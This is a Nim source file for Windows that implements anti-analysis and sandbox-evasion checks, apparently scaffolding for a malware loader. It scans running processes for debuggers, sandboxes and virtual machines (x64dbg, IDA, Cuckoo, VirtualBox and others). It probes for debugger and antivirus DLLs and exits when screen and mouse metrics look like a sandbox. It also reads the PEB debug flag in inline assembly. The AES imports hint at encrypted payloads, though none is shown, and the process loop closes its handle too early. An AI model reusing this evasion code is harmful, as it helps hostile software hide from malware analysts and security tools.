import winim
import times
import os
import nimcrypto
import nimcrypto/[rijndael, bcmode]



proc isProcessRunning(target: string): bool=
  var pe : PROCESSENTRY32
  pe.dwsize = sizeof(PROCESSENTRY32).DWORD
  let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)

  if snapshot == INVALID_HANDLE_VALUE:
    return false

  var hasEntry = Process32First(snapshot,addr pe)

  while hasEntry:
    let procName = $cast[cstring](addr pe.szExeFile[0])
    if procName == target:
      CloseHandle(snapshot)
      return true
    hasEntry = Process32Next(snapshot,addr pe)
    CloseHandle(snapshot)
  return false

proc is_system_metric_normal(): bool =
  var suspicious_score = 0

  let mouseButtons = GetSystemMetrics(SM_CMOUSEBUTTONS)
  let sceenNumber = GetSystemMetrics(SM_CMONITORS)
  let widthDesktopSize = GetSystemMetrics(SM_CXVIRTUALSCREEN)
  let heightDesktopSize = GetSystemMetrics(SM_CYVIRTUALSCREEN)
  let debug = GetSystemMetrics(SM_DEBUG)

  if mouseButtons == 0:
    echo "hello from sandbox"
    quit(0)

  if debug == 1:
    suspicious_score.inc()

  if mouseButtons > 5:
    suspicious_score.inc()

  if sceenNumber == 1:
    suspicious_score.inc()

  if (widthDesktopSize == 1024 and heightDesktopSize == 768) or (widthDesktopSize == 1280 and heightDesktopSize == 1024):
    suspicious_score.inc()

  if suspicious_score >= 3:
    echo "suspicious score > 2"
    quit(0)
    
    return false
  echo mouseButtons
  echo sceenNumber
  echo widthDesktopSize
  echo heightDesktopSize
  return true

proc is_debbuging_process_present():bool=

  let procs = [
  "ollydbg.exe",          # OllyDbg (Débogueur 32-bit)
  "x64dbg.exe",           # x64dbg (Débogueur 64-bit)
  "x32dbg.exe",           # x32dbg (Version 32-bit de x64dbg)
  "immdbg.exe",           # Immunity Debugger
  "windbg.exe",           # WinDbg (Microsoft Debugger)
  "devenv.exe",           # Visual Studio Debugger
  "vsdbg.exe",            # Visual Studio Debugger (Debugger pour .NET Core)
  "idag.exe",             # IDA Pro (Outil d'ingénierie inverse)
  "idaq.exe",             # IDA Pro (Version 64-bit)
  "procdump.exe",         # ProcDump (Outil de capture de dump pour le débogage)
  "immunitydbg.exe",      # Immunity Debugger (Autre version)
  "sandboxie.exe",        # Sandboxie (Outil de sandboxing populaire)
  "SandboxieD.exe",       # Sandboxie (Démon du service Sandboxie)
  "vmware.exe",           # VMware (Machine virtuelle)
  "vmware-vmx.exe",       # VMware (Processus de la machine virtuelle)
  "VirtualBox.exe",       # VirtualBox (Machine virtuelle)
  "VBoxHeadless.exe",     # VirtualBox (Mode sans tête pour exécution dans VM)
  "VBoxSVC.exe",          # VirtualBox (Service de VirtualBox)
  "VBoxService.exe",      # VirtualBox (Service de la machine virtuelle)
  "cuckoo.py",            # Cuckoo Sandbox (outil d'analyse automatisée de malwares)
  "cuckoo.exe",           # Cuckoo Sandbox (Exécutable sur Windows)
  "fireeye.exe",          # FireEye (Solution de sécurité, analyse de malwares)
  "detox.exe",            # Detox (Outil d'analyse de malware dans certaines sandboxes)
  "WindowsSandbox.exe"    # Windows Sandbox (Sandboxing native sur Windows)
  ]

  for proc_name in procs:
    if isProcessRunning(proc_name):
      return true
  return false

proc is_debbuging_dll_present():bool =

  let dlls = [
  "ollydbg.dll",        
  "x64dbg.dll",
  "dbghelp.dll",     
  "ida.dll",         
  "idag.exe",        
  "immunitydbg.dll", 
  "ghidra.dll",      
  "x32dbg.dll",
  "avastui.dll",     
  "kaspersky_filter.dll",   
  "peid.dll",        
  "ollydbg.dll",   
  "vmware.dll",      
  "vmhgfs.dll",      
  "VBoxRT.dll",      
  "VBoxUVM.dll"      
  ]


  for dll in dlls:
    if GetModuleHandle(dll) != 0 :
      return true
  return false

proc is_debbuging_check_PEB():bool {.asmNoStackFrame} =
    asm """
    .intel_syntax noprefix
    mov rax, gs:[0x60]
    movzx rax, byte ptr [rax+2]
		.att_syntax
    ret"""